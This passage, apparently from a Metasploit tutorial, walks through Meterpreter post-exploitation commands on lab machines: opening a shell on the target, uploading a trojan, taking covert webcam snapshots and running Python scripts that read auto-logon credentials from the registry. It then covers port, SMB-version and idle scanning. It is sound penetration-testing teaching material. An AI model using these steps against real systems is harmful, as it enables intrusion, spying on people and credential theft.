    152   VMwareTray.exe        C:\Program Files\VMware\VMware Tools\VMwareTray.exe
    288   snmp.exe              C:\WINDOWS\System32\snmp.exe
 ...snip...


resource
^^^^^^

The ‘resource‘ command will execute Meterpreter instructions located inside a text file. Containing one entry per line, “resource” will execute each line in sequence. This can help automate repetitive actions performed by a user.

By default, the commands will run in the current working directory (on target machine) and resource file in the local working directory (the attacking machine).

::

  meterpreter > resource
 Usage: resource path1 path2Run the commands stored in the supplied files.
 meterpreter >


::

  root@kali:~# cat resource.txt
 ls
 background
 root@kali:~#


Running resource command:

::

  meterpreter> > resource resource.txt
 [*] Reading /root/resource.txt
 [*] Running ls

 Listing: C:\Documents and Settings\Administrator\Desktop
 ========================================================

 Mode              Size    Type  Last modified              Name
 ----              ----    ----  -------------              ----
 40777/rwxrwxrwx   0       dir   2012-02-29 16:41:29 -0500  .
 40777/rwxrwxrwx   0       dir   2012-02-02 12:24:40 -0500  ..
 100666/rw-rw-rw-  606     fil   2012-02-15 17:37:48 -0500  IDA Pro Free.lnk
 100777/rwxrwxrwx  681984  fil   2012-02-02 15:09:18 -0500  Sc303.exe
 100666/rw-rw-rw-  608     fil   2012-02-28 19:18:34 -0500  Shortcut to Ability Server.lnk
 100666/rw-rw-rw-  522     fil   2012-02-02 12:33:38 -0500  XAMPP Control Panel.lnk

 [*] Running background

 [*] Backgrounding session 1...
 msf  exploit(handler) >


search
^^^^^^

The ‘search‘ commands provides a way of locating specific files on the target host. The command is capable of searching through the whole system or specific folders.

 Wildcards can also be used when creating the file pattern to search for.

 ::

   meterpreter > search
 [-] You must specify a valid file glob to search for, e.g. >search -f *.doc


::

  meterpreter > search -f autoexec.bat
 Found 1 result...
    c:\AUTOEXEC.BAT
 meterpreter > search -f sea*.bat c:\\xamp\\
 Found 1 result...
    c:\\xampp\perl\bin\search.bat (57035 bytes)
 meterpreter >


shell
^^^^^^

The ‘shell‘ command will present you with a standard shell on the target system.

::

  meterpreter > shell
 Process 39640 created.
 Channel 2 created.
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.

 C:\WINDOWS\system32>


upload
^^^^^^

As with the ‘download‘ command, you need to use double-slashes with the upload command.

::

  meterpreter > upload evil_trojan.exe c:\\windows\\system32
 [*] uploading  : evil_trojan.exe -> c:\windows\system32
 [*] uploaded   : evil_trojan.exe -> c:\windows\system32\evil_trojan.exe
 meterpreter >


webcam_list
^^^^^^^^

The ‘webcam_list‘ command when run from the Meterpreter shell, will display currently available web cams on the target host.

::

  meterpreter > webcam_list
 1: Creative WebCam NX Pro
 2: Creative WebCam NX Pro (VFW)
 meterpreter >


webcam_snap
^^^^^^

The ‘webcam_snap’ command grabs a picture from a connected web cam on the target system, and saves it to disc as a JPEG image. By default, the save location is the local current working directory with a randomized filename.

::

  meterpreter > webcam_snap -h
 Usage: webcam_snap [options]
 Grab a frame from the specified webcam.

 OPTIONS:

    -h      Help Banner
    -i >opt>  The index of the webcam to use (Default: 1)
    -p >opt>  The JPEG image path (Default: 'gnFjTnzi.jpeg')
    -q >opt>  The JPEG image quality (Default: '50')
    -v >opt>  Automatically view the JPEG image (Default: 'true')

 meterpreter >


Meterpreter extended by python
------

Here are some examples of the Python Extension in action. With time more functionality will be added, making the extension an even more powerful tool.

With the extension loaded, we can use basic Python function such as print. This can be achieved by using the “python_execute” command, and standard Python syntax.

::

  meterpreter > python_execute "print 'Good morning! It\\'s 5am'"
 [+] Content written to stdout:
 Good morning! It's 5am

You can also save to a variable, and print its content using the “-r” switch.

::

  meterpreter > python_execute "import os; cd = os.getcwd()" -r cd
 [+] cd = C:\Users\loneferret\Downloads
 meterpreter >


The following file is located in the “root” folder of our machine. What it does essentially, search the C:\ drive for any file called “readme.txt”. Although this can be done with meterpreter’s native “search” command. One observation, running through the filesystem, has crashed our meterpreter session more than once.

::

  root@kali:~# cat findfiles.py
 import os
 for root, dirs, files in os.walk("c://"):
     for file in files:
         if file.endswith(".txt") and file.startswith("readme"):
              print(os.path.join(root, file))


In order to have this file run on our target machine, we need to invoke the “python_import” command. Using the “-f” switch to specify our script.

::

  meterpreter > python_import -f /root/findfiles.py
 [*] Importing /root/findfiles.py ...
 [+] Content written to stdout:
 c://Program Files\Ext2Fsd\Documents\readme.txt
 c://qemu-0.13.0-windows\patch\readme.txt
 c://Users\loneferret\Desktop\IM-v1.9.16.0\readme.txt


Another example, this time printing some memory information, and calling a Windows message box using the “ctypes” Python module.

::

  meterpreter > python_import -f /root/ctypes_ex.py
 [*] Importing /root/ctypes_ex.py ...
 [+] Content written to stdout:
 >WinDLL 'kernel32', handle 76e30000 at 4085e50>

 metrepreter > python_import -f /root/msgbox.py
 [*] Importing /root/msgbox.py ...
 [+] Command executed without returning a result


Of course, this all depends on the level of access your current meterpreter has. Another simple Python script example, reads the Window’s registry for the “AutoAdminLogon” key.

::

  meterpreter > python_import -f /root/readAutoLogonREG.py
 [*] Importing /root/readAutoLogonREG.py ...
 [+] Content written to stdout:


 [+] Reading from AutoLogon Registry Location
 [-] DefaultUserName loneferret
 [-] DefaultPassword NoNotReally
 [-] AutoAdminLogon Enabled



**************************
Information Gathering
**************************

Port Scanning
==========

Scanners and most other auxiliary modules use the RHOSTS option instead of RHOST. RHOSTS can take IP ranges (192.168.1.20-192.168.1.30), CIDR ranges (192.168.1.0/24), multiple ranges separated by commas (192.168.1.0/24, 192.168.3.0/24), and line-separated host list files (file:/tmp/hostlist.txt). This is another use for a grepable Nmap output file.

By default, all of the scanner modules will have the THREADS value set to ‘1’. The THREADS value sets the number of concurrent threads to use while scanning. Set this value to a higher number in order to speed up your scans or keep it lower in order to reduce network traffic but be sure to adhere to the following guidelines:

*  Keep the THREADS value under 16 on native Win32 systems
*  Keep THREADS under 200 when running MSF under Cygwin
*  On Unix-like operating systems, THREADS can be set as high as 256.


Nmap & db_nmap
-----------

We can use the db_nmap command to run Nmap against our targets and our scan results would than be stored automatically in our database. However, if you also wish to import the scan results into another application or framework later on, you will likely want to export the scan results in XML format. It is always nice to have all three Nmap outputs (xml, grepable, and normal). So we can run the Nmap scan using the ‘-oA‘ flag followed by the desired filename to generate the three output files, then issue the db_import command to populate the Metasploit database.

Run Nmap with the options you would normally use from the command line. If we wished for our scan to be saved to our database, we would omit the output flag and use db_nmap. The example below would then be “db_nmap -v -sV 192.168.1.0/24”.

::

  msf > nmap -v -sV 192.168.1.0/24 -oA subnet_1
 [*] exec: nmap -v -sV 192.168.1.0/24 -oA subnet_1

 Starting Nmap 5.00 ( http://nmap.org ) at 2009-08-13 19:29 MDT
 NSE: Loaded 3 scripts for scanning.
 Initiating ARP Ping Scan at 19:29
 Scanning 101 hosts [1 port/host]
 ...
 Nmap done: 256 IP addresses (16 hosts up) scanned in 499.41 seconds
 Raw packets sent: 19973 (877.822KB) | Rcvd: 15125 (609.512KB)

Port Scanning
-----------

In addition to running Nmap, there are a variety of other port scanners that are available to us within the framework.

::

  msf > search portscan

 Matching Modules
 ================

   Name                                      Disclosure Date  Rank    Description
   ----                                      ---------------  ----    -----------
   auxiliary/scanner/natpmp/natpmp_portscan                   normal  NAT-PMP External Port Scanner
   auxiliary/scanner/portscan/ack                             normal  TCP ACK Firewall Scanner
   auxiliary/scanner/portscan/ftpbounce                       normal  FTP Bounce Port Scanner
   auxiliary/scanner/portscan/syn                             normal  TCP SYN Port Scanner
   auxiliary/scanner/portscan/tcp                             normal  TCP Port Scanner
   auxiliary/scanner/portscan/xmas                            normal  TCP "XMas" Port Scanner



For the sake of comparison, we’ll compare our Nmap scan results for port 80 with a Metasploit scanning module. First, let’s determine what hosts had port 80 open according to Nmap.

::

  msf > cat subnet_1.gnmap | grep 80/open | awk '{print $2}'
 [*] exec: cat subnet_1.gnmap | grep 80/open | awk '{print $2}'

 192.168.1.1
 192.168.1.2
 192.168.1.10
 192.168.1.109
 192.168.1.116
 192.168.1.150


The Nmap scan we ran earlier was a SYN scan so we’ll run the same scan across the subnet looking for port 80 through our eth0 interface, using Metasploit.

::

  msf > use auxiliary/scanner/portscan/syn
 msf auxiliary(syn) > show options

 Module options (auxiliary/scanner/portscan/syn):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to scan per set
   DELAY      0                yes       The delay between connections, per thread, in milliseconds
   INTERFACE                   no        The name of the interface
   JITTER     0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS      1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                      yes       The target address range or CIDR identifier
   SNAPLEN    65535            yes       The number of bytes to capture
   THREADS    1                yes       The number of concurrent threads
   TIMEOUT    500              yes       The reply read timeout in milliseconds

 msf auxiliary(syn) > set INTERFACE eth0
 INTERFACE => eth0
 msf auxiliary(syn) > set PORTS 80
 PORTS => 80
 msf auxiliary(syn) > set RHOSTS 192.168.1.0/24
 RHOSTS => 192.168.1.0/24
 msf auxiliary(syn) > set THREADS 50
 THREADS => 50
 msf auxiliary(syn) > run

 [*] TCP OPEN 192.168.1.1:80
 [*] TCP OPEN 192.168.1.2:80
 [*] TCP OPEN 192.168.1.10:80
 [*] TCP OPEN 192.168.1.109:80
 [*] TCP OPEN 192.168.1.116:80
 [*] TCP OPEN 192.168.1.150:80
 [*] Scanned 256 of 256 hosts (100% complete)
 [*] Auxiliary module execution completed


Here we’ll load up the ‘tcp’ scanner and we’ll use it against another target. As with all the previously mentioned plugins, this uses the RHOSTS option. Remember we can issue the ‘hosts -R‘ command to automatically set this option with the hosts found in our database.

::

  msf > use auxiliary/scanner/portscan/tcp
 msf  auxiliary(tcp) > show options

 Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target address range or CIDR identifier
   THREADS      1                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

 msf  auxiliary(tcp) > hosts -R

 Hosts
 =====

 address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments
 -------         ---                ----  -------  ---------  -----  -------  ----  --------
 172.16.194.172  00:0C:29:D1:62:80        Linux    Ubuntu            server

 RHOSTS => 172.16.194.172

 msf  auxiliary(tcp) > show options

 Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   FILTER                        no        The filter string for capturing traffic
   INTERFACE                     no        The name of the interface
   PCAPFILE                      no        The name of the PCAP capture file to process
   PORTS        1-1024           yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       172.16.194.172   yes       The target address range or CIDR identifier
   SNAPLEN      65535            yes       The number of bytes to capture
   THREADS      10                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

 msf  auxiliary(tcp) > run

 [*] 172.16.194.172:25 - TCP OPEN
 [*] 172.16.194.172:23 - TCP OPEN
 [*] 172.16.194.172:22 - TCP OPEN
 [*] 172.16.194.172:21 - TCP OPEN
 [*] 172.16.194.172:53 - TCP OPEN
 [*] 172.16.194.172:80 - TCP OPEN
 [*] 172.16.194.172:111 - TCP OPEN
 [*] 172.16.194.172:139 - TCP OPEN
 [*] 172.16.194.172:445 - TCP OPEN
 [*] 172.16.194.172:514 - TCP OPEN
 [*] 172.16.194.172:513 - TCP OPEN
 [*] 172.16.194.172:512 - TCP OPEN
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 msf  auxiliary(tcp) >


We can see that Metasploit’s built-in scanner modules are more than capable of finding systems and open ports for us. It’s just another excellent tool to have in your arsenal if you happen to be running Metasploit on a system without Nmap installed.

SMB Version Scanning
------

Now that we have determined which hosts are available on the network, we can attempt to determine the operating systems they are running. This will help us narrow down our attacks to target a specific system and will stop us from wasting time on those that aren’t vulnerable to a particular exploit.

Since there are many systems in our scan that have port 445 open, we will use the scanner/smb/version module to determine which version of Windows is running on a target and which Samba version is on a Linux host.

::

  msf > use auxiliary/scanner/smb/smb_version
 msf auxiliary(smb_version) > set RHOSTS 192.168.1.200-210
 RHOSTS => 192.168.1.200-210
 msf auxiliary(smb_version) > set THREADS 11
 THREADS => 11
 msf auxiliary(smb_version) > run

 [*] 192.168.1.209:445 is running Windows 2003 R2 Service Pack 2 (language: Unknown) (name:XEN-2K3-FUZZ) (domain:WORKGROUP)
 [*] 192.168.1.201:445 is running Windows XP Service Pack 3 (language: English) (name:V-XP-EXPLOIT) (domain:WORKGROUP)
 [*] 192.168.1.202:445 is running Windows XP Service Pack 3 (language: English) (name:V-XP-DEBUG) (domain:WORKGROUP)
 [*] Scanned 04 of 11 hosts (036% complete)
 [*] Scanned 09 of 11 hosts (081% complete)
 [*] Scanned 11 of 11 hosts (100% complete)
 [*] Auxiliary module execution completed


Also notice that if we issue the hosts command now, the newly-acquired information is stored in Metasploit’s database.

::

  msf auxiliary(smb_version) > hosts

 Hosts
 =====

 address        mac  name  os_name            os_flavor  os_sp  purpose  info  comments
 -------        ---  ----  -------            ---------  -----  -------  ----  --------
 192.168.1.201             Microsoft Windows  XP         SP3    client
 192.168.1.202             Microsoft Windows  XP         SP3    client
 192.168.1.209             Microsoft Windows  2003 R2    SP2    server


Idle Scanning
-------

Nmap’s IPID Idle scanning allows us to be a little stealthy scanning a target while spoofing the IP address of another host on the network. In order for this type of scan to work, we will need to locate a host that is idle on the network and uses IPID sequences of either Incremental or Broken Little-Endian Incremental. Metasploit contains the module scanner/ip/ipidseq to scan and look for a host that fits the requirements.

In the free online Nmap book, you can find out more information on Nmap Idle Scanning. https://nmap.org/book/idlescan.html


::

  msf > use auxiliary/scanner/ip/ipidseq
 msf auxiliary(ipidseq) > show options

 Module options (auxiliary/scanner/ip/ipidseq):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   INTERFACE                   no        The name of the interface
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   SNAPLEN    65535            yes       The number of bytes to capture
   THREADS    1                yes       The number of concurrent threads
   TIMEOUT    500              yes       The reply read timeout in milliseconds

 msf auxiliary(ipidseq) > set RHOSTS 192.168.1.0/24
 RHOSTS => 192.168.1.0/24
 msf auxiliary(ipidseq) > set THREADS 50
 THREADS => 50
 msf auxiliary(ipidseq) > run

 [*] 192.168.1.1's IPID sequence class: All zeros
 [*] 192.168.1.2's IPID sequence class: Incremental!
 [*] 192.168.1.10's IPID sequence class: Incremental!
 [*] 192.168.1.104's IPID sequence class: Randomized
 [*] 192.168.1.109's IPID sequence class: Incremental!
 [*] 192.168.1.111's IPID sequence class: Incremental!
 [*] 192.168.1.114's IPID sequence class: Incremental!
 [*] 192.168.1.116's IPID sequence class: All zeros
 [*] 192.168.1.124's IPID sequence class: Incremental!
 [*] 192.168.1.123's IPID sequence class: Incremental!
 [*] 192.168.1.137's IPID sequence class: All zeros
 [*] 192.168.1.150's IPID sequence class: All zeros
 [*] 192.168.1.151's IPID sequence class: Incremental!
 [*] Auxiliary module execution completed


Judging by the results of our scan, we have a number of potential zombies we can use to perform idle scanning. We’ll try scanning a host using the zombie at 192.168.1.109 and see if we get the same results we had earlier.

::

  msf auxiliary(ipidseq) > nmap -Pn -sI 192.168.1.109 192.168.1.114
 [*] exec: nmap -Pn -sI 192.168.1.109 192.168.1.114

 Starting Nmap 5.00 ( http://nmap.org ) at 2009-08-14 05:51 MDT
 Idle scan using zombie 192.168.1.109 (192.168.1.109:80); Class: Incremental
 Interesting ports on 192.168.1.114:
 Not shown: 996 closed|filtered ports
 PORT STATE SERVICE
 135/tcp open msrpc
 139/tcp open netbios-ssn
 445/tcp open microsoft-ds
 3389/tcp open ms-term-serv
 MAC Address: 00:0C:29:41:F2:E8 (VMware)

 Nmap done: 1 IP address (1 host up) scanned in 5.56 seconds
